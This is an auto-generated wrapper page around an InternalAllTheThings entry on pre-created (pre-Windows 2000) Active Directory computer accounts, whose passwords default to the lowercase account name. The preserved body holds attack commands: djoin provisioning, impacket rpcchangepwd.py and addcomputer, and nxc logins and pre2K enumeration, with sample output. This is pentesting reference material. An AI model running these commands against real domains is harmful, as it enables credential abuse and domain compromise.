---
parsed_by: focuslocust
source: internalallthethings
type: generated
---
# Password - Pre-Created Computer Account

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `internalallthethings` |
| Type | `internal-topic` |
| Record ID | `iatt-active-directory-pwd-precreated-computer` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/internalallthethings/docs/active-directory/pwd-precreated-computer.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [Password - Pre-Created Computer Account](../../topics/active-directory/password-pre-created-computer-account.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | iatt-active-directory-pwd-precreated-computer |
| name | Password - Pre-Created Computer Account |
| type | internal-topic |
| source | internalallthethings |
| url | https://github.com/swisskyrepo/InternalAllTheThings/blob/main/docs/active-directory/pwd-precreated-computer.md |

## Preserved Source Material

````yaml
_body: "# Password - Pre-Created Computer Account\n\nWhen `Assign this computer account as a pre-Windows 2000 computer` checkmark\
  \ is checked, the password for the computer account becomes the same as the computer account in lowercase. For instance,\
  \ the computer account **SERVERDEMO$** would have the password **serverdemo**.\n\n```ps1\n# Create a machine with default\
  \ password\n# must be run from a domain joined device connected to the domain\ndjoin /PROVISION /DOMAIN <fqdn> /MACHINE\
  \ evilpc /SAVEFILE C:\\temp\\evilpc.txt /DEFPWD /PRINTBLOB /NETBIOS evilpc\n```\n\n* When you attempt to login using the\
  \ credential you should have the following error code : `STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT`.\n* Then you need to\
  \ change the password with [rpcchangepwd.py](https://github.com/SecureAuthCorp/impacket/pull/1304)\n\n    ```ps1\n    python3\
  \ rpcchangepwd.py '<DOMAIN>/COMPUTER>$':'<PASSWORD>'@<DC IP> -newpass '<PASS>'\n    ```\n\n:warning: When the machine account\
  \ name and the password are the same, the machine will also act like a pre-Windows 2000 computer and the authentication\
  \ will result in `STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT`.\n\n```ps1\n$ impacket-addcomputer -dc-ip 10.10.10.10 EXODIA.LOCAL/Administrator:P@ssw0rd\
  \ -computer-name swkserver -computer-pass swkserver\n[*] Successfully added machine account swkserver$ with password swkserver.\n\
  \n$ nxc smb 10.10.10.10 -u 'swkserver$' -p swkserver    \nSMB         10.10.10.10    445    WIN-8OJFTLMU1IG  [*] Windows\
  \ 10 / Server 2019 Build 17763 x64 (name:WIN-8OJFTLMU1IG) (domain:EXODIA.LOCAL) (signing:True) (SMBv1:False)\nSMB      \
  \   10.10.10.10    445    WIN-8OJFTLMU1IG  [-] EXODIA.LOCAL\\swkserver$:swkserver STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT\n\
  ```\n\n## Enumerate Pre-Created Computer Account\n\nIdentify pre-created computer accounts, save the results to a file,\
  \ and obtain TGTs for each\n\n```ps1\nnxc -u username -p password -M pre2K\n```\n\n## References\n\n* [DIVING INTO PRE-CREATED\
  \ COMPUTER ACCOUNTS - May 10, 2022 - By Oddvar Moe](https://www.trustedsec.com/blog/diving-into-pre-created-computer-accounts/)"
_relative_path: active-directory/pwd-precreated-computer.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/internalallthethings/docs/active-directory/pwd-precreated-computer.md
````
